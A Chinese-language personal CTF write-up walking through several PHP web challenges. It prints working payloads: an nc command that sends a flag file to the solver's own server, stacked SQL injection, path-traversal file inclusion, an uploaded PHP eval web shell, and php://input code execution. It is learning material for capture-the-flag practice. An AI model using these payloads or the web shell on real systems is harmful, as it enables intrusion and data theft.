# CTF刷题WriteUp

## WEB

### "百度杯"CTF比赛 十月场——EXEC

**进入网站页面**

![image-20210501154827617](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501154827617.png)

**查看源码**

发现了vim，可能是vim泄露，于是在url地址输入了http://21b854b211034489a4ee1cb0d37b0212560fbf24f2e6468d.changame.ichunqiu.com/.index.php.swp

![image-20210501155039314](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155039314.png)

或者通过dirsearch工具扫描网站目录也可以发现 `/.index.php.swp`，也可以想到vim泄露

![image-20210501155453793](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155453793.png)

下载文件

![image-20210501155637128](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501155637128.png)

下一步就是通过 `vim -r index.php.swp`恢复index.php,然后打开

~~~php
<html>
<head>
<title>blind cmd exec</title>
<meta language='utf-8' editor='vim'>
</head>
</body>
<img src=pic.gif>
<?php
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
	setcookie('auth','tcp tunnel is forbidden!');
	if(isset($_POST['cmd'])){
		$command=$_POST[cmd];
		$result=exec($command);
		//echo $result;
	}
}else{
	die('no sign');
}
?>
</body>
</html>
~~~

这里有一个check函数需要绕过，很明显check函数就是把选手输入的数字一个一个的判断，查看这些数字的ASCII码是否在1-9的ASCII码之间，如果符合则验证失败。如果check函数想最后返回返回true，则`$number`需要等于'11259375'，这里可以使用十六进制来绕过即可。

代码里面的 `setcookie('auth','tcp tunnel is forbidden!');`告诉我们TCP被禁止不能用curl,而且cmd命令执行之后也没有回显，但是前面的注释告诉了我们flag文件，我们可以直接用nc命令把flag文件下过来，我们需要一台有公网ip的服务器。

在服务器上运行

~~~sh
nc -lup 39999
~~~

然后再题目那里用post方法 cmd=nc -u 你的ip地址 39999 < flag233.php

**注：这里我踩了个小坑，`cmd=nc`我输入成了 `cmd = nc`，等于号两边不能有空格。**

![image-20210501160323527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160323527.png)

flag便传到了服务器上

![image-20210501160629527](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501160629527.png)

### [强网杯 2019]随便注 1

**1.进入网址**

![image-20210501180925552](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501180925552.png)

**2.输入`1‘`符号报语法错误，再输入 `1’ #`页面正常**

![image-20210501181059554](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181059554.png)

**3.接下来尝试 `order by`查看有几列数据显示**，然后配合 `union select`显示数据库的一些信息，但是select、delete等一些关键字被限制，到这里我知道可能被后台代码做了限制，于是去找了一些绕过限制的语句或者关键字特殊编码，但是都失败了。于是后面便没有了思路，自己还需要多努力啊。。。。多刷题！多扩展思路！

![image-20210501181535674](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501181535674.png)

**4.在网上搜了下解决方案，可以使用堆叠注入，果然可以，把全部库名都给查出来了**

![image-20210501192326812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192326812.png)

**5.OK继续查表名**

![image-20210501192423272](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192423272.png)

**6.然后就是分别查看"1919810931114514"表与"words"表这两个表的结构**

![image-20210501192950713](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501192950713.png)

![image-20210501193132021](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501193132021.png)

使用了关键字 `desc`来查看表里的字段结构，注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符

**7.由此可以想到该输入框的SQL语句应该是 `select id,data from words where id = ?`**

因为可以是堆叠查询，这时候我们可以使用改名的方法，把含有flag的"1919810931114514"表改名为words，再把flag字段改名为id，结合上面的1' or 1 #爆出表内所有的内容就可以查到flag了。

~~~sql
1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table words change flag id varchar(100) character set utf8 collate utf8_general_ci NOT NULL;desc words;#
~~~

![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/1790307-20200225003553488-841750902.png)

**8. 再用一下一开始的操作id=1' or 1=1#，最终获得flag值**

![image-20210501194343817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210501194343817.png)

> 突然发现自己好菜啊，果然光听不练假把式。在实践中学习，在学习中实践！以下是第二天的题，记录下自己踩得坑，得到了什么经验，学到了什么新东西。但是发现自己踩得全是坑。。。。。

### “百度杯”CTF比赛 2017 二月场——爆破-1

进入网站

![image-20210502140954426](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502140954426.png)

呦吼，阅读php代码，有点javaweb语言基础的我还是勉强能看懂的，就是有些特殊的函数就不知道它的具体功能了，百度。。。。其中不认识的php函数我都整理到了PHP代码审计的笔记中了。

网上的解题思路大部分都是看见了两个$$符号，就猜到了要考察`GLOBALS`超全局变量，而我这个小菜鸟连这个超全局变量都没听说过，又学到了新东西。结合自己的想法，$a表示URL中输入的参数值，但是GLOBALS变量使用前要有$符号，所以看见两个$$符号就想到了GLOBALS。这是自己的理解。

![image-20210502142121838](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502142121838.png)

解题成功，通过这道题学到了GLOBALS超全局变量。

### “百度杯”CTF比赛 2017 二月场——爆破-2

![image-20210502143146826](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502143146826.png)

该题就是通过url的参数值来获得flag.php中的flag值。怎么获得呢？如果直接输入`flag.php`会被当成字符串执行，没有任何意义，我们读取需要flag.php文件里面的内容。所以可以使用`file()、file_get_contents()`函数，提前把flag.php读入一个数组或者字符串，然后在通过var_dump()函数把变量输出，但是输出的内容就是flag.php文件里面的内容。

还有一种方法就是拼接字符串。`1);show_source('flag.php');var_dump(` 把var_dump()拆分成三个函数即可。

![image-20210502144424875](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502144424875.png)

### “百度杯”CTF比赛 九月场——SQL

![image-20210502144617838](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502144617838.png)

需要对id参数进行SQL注入，测试得到是整数型注入，但是order by 、union select等一些关键字都被限制了，学到了一个新的绕过姿势，使用<>绕过。便可一路过关斩将，利用information_schema库的一些信息来获得了flag值。

**首先获得表**

![image-20210502150010162](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150010162.png)

**获得表中的字段**

![image-20210502150334897](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150334897.png)

**最终可以获得表中的值**

![image-20210502150439645](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502150439645.png)

### “百度杯”CTF比赛 十月场——Login

![image-20210502151044842](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151044842.png)

进去网站我看见是一个登录页面，然后我就迫不接待的打开了brup打算暴力破解密码，这里非常成功的踩了第一个坑。没有看注释，注释里给了账号和密码，说明出题人考察的方面根本就不是暴力破解密码。

![image-20210502151316297](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151316297.png)

接下来登录进去网站，发现啥也没有。

![image-20210502151421923](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502151421923.png)

好了，又没思路了，我可太菜了。。。。。借鉴一下别人的思路，用burp抓包试试。

![image-20210502152040368](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502152040368.png)

发现了response里面有个可以的参数show=0，我们可以试试从客户端发个show=1的包看看服务器的响应是怎么样的。成功获得一段PHP代码，又要开始代码审计了。马马虎虎能看懂，还需要再学学PHP啊。

![image-20210502152338715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502152338715.png)

~~~php
<?php
	include 'common.php';
	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
	class db
	{
		public $where;
		function __wakeup()
		{
			if(!empty($this->where))
			{
				$this->select($this->where);
			}
		}

		function select($where)
		{
			$sql = mysql_query('select * from user where '.$where);
			return @mysql_fetch_array($sql);
		}
	}

	if(isset($requset['token']))
	{
		$login = unserialize(gzuncompress(base64_decode($requset['token'])));
		$db = new db();
		$row = $db->select('user=\''.mysql_real_escape_string($login['user']).'\'');
		if($login['user'] === 'ichunqiu')
		{
			echo $flag;
		}else if($row['pass'] !== $login['pass']){
			echo 'unserialize injection!!';
		}else{
			echo "(╯‵□′)╯︵┴─┴ ";
		}
	}else{
		header('Location: index.php?error=1');
	}

?>
~~~

来吧兄弟们，代码审计走起来。class db这一段就是对数据库的一个操作，对本体来说不重要， 重点看 `if(isset($requset['token']))`这个里面的代码！以下是我对本段代码的理解。

获取token的值，token值经过了base64解码-->解压缩-->对单一的已序列化的变量进行操作将其转换回PHP 的值,

最终获得login变量，但是login变量里的user值必须为'ichunqiu'才会获得flag。

现在就是构造一个token，给它的user值赋予'ichunqiu'，然后序列化-->压缩-->base64编码

![image-20210502154345812](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154345812.png)



![image-20210502154334063](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154334063.png)

最后加cookie里面加上token参数给服务器发送。服务器便会成功返回一个flag值。

![image-20210502154529559](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502154529559.png)

成功返回flag值，奥利给，又学了新东西。

### [HCTF 2018]WarmUp 1

这是一个代码审计题，首先进入网站，查看源码

### ![image-20210502180730817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502180730817.png)

发现了提示信息，然后咱们在URL地址中输入 `source.php`，查看跳转页面，页面显示如下代码，好吧，开始看代码吧。。。。。。

~~~php+HTML
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {	//定义了白名单
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
//isset()判断变量是否声明,is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
//file里输入的内容是否是白名单内的字符串，符合则返回true
            if (in_array($page, $whitelist)) {
                return true;
            }
 //过滤问号的函数(如果$page的值有?则从?之前提取字符串,没有则提取整个字符串)
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置
            );
//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真，此时我用的payload已经符合，返回true            
            if (in_array($_page, $whitelist)) {
                return true;
            }
//url对$page解码
            $_page = urldecode($page);
//过滤问号的函数           
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真            
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])		#file不能为空
        && is_string($_REQUEST['file'])	#file必须为字符串
        && emmm::checkFile($_REQUEST['file'])#要符合checkFile函数，成功返回True
    ) {
        include $_REQUEST['file'];		#执行文件包含命令
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

~~~

发现白名单中还有个 `hint.php`文件，进去看看，告诉我们flag在哪里。

![image-20210502181936929](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502181936929.png)

**payload：**

~~~php
?file=hint.php?../../../../../ffffllllaaaagggg
~~~

我们可以想象他传入checkFile函数要经历 第一次白名单验证, 一次?过滤后,他就是hint.php 再进行一次白名单验证 返回为真, 则达成条件进行包含得到flag

![image-20210502182300265](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502182300265.png)

### “百度杯”CTF比赛 2017 二月场——爆破3

进入网站

![image-20210502183455576](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502183455576.png)

映入眼帘的又是PHP代码，看来PHP是世界上最好的语言这句话没有错啊，哈哈哈哈，靶场全都是PHP代码，慢慢积累慢慢学吧。

说正题，先阅读一下代码，大体意思是Session中的num初始值为0，time为当前时间，whoami的初始值为ea。120秒之后销毁会话。用str_rands随机生成2个字母，whoami需要等于我们传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++，whoami=str_rands，循环10次后，输出flag。


~~~php
<?php 
error_reporting(0);//不显示错误信息
session_start();//启动新会话或者重用现有会话
require('./flag.php');
if(!isset($_SESSION['nums'])){//给session会话初试赋值
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){//120秒之后销毁session会话
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];
//
if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){	//num>=10会输出flag
  echo $flag;
}

show_source(__FILE__);
?>

~~~

由19行可看出为弱判断类型，可以用数组进行绕过，md5函数不能对数组进行处理，所以传数组。md5()==0

根据获取到的信息构造payload    ?value[]=ea

代码中提到需要提交大于10次，10次过后得到flag

![image-20210502190337932](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502190337932.png)

本题学到了数组在传值的应用，以及md5对数组加密无效。加油！！！

### “百度杯”CTF比赛 九月场——Upload

打开网页上传shell文件，结果发现前面的<?php被限制去掉了

![image-20210502194728556](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502194728556.png)

百度了一下原来还有PHP长标签，又是收获啊

~~~javascript
<script language="PHP"> //php小写被过滤了，所以改成了大写，也可以大小写混合
  @eval($_POST["pass"]);    
</script>
~~~

再次上传shell脚本，结果页面无显示，说明上传成功了。接下来就是打开蚁剑，建立连接成功。

![image-20210502195327414](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195327414.png)

成功获得flag

![image-20210502195626813](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195626813.png)

### “百度杯”CTF比赛 2017 二月场——include

进入页面

![image-20210502195853956](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195853956.png)

先搜索一下是否允许文件包含，给你phpinfo的作用不就是这样，发现允许文件包含，所以可以用`php://input`伪协议包含文件。

![image-20210502200012326](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502200012326.png)

接下来看代码要求

~~~php
<?php 
show_source(__FILE__);
if(isset($_REQUEST['path'])){
    include($_REQUEST['path']);
}else{
    include('phpinfo.php');
}
~~~

path可以直接传参数进行文件包含。。。抓包，用PHP伪协议执行php代码，没想到成功了。

![image-20210502201036831](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201036831.png)

发现了个可以的文件名，直接执行linux系统命令

~~~php
<?php system("cat dle345aae.php");?>
~~~

成功获得flag

![image-20210502201315455](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201315455.png)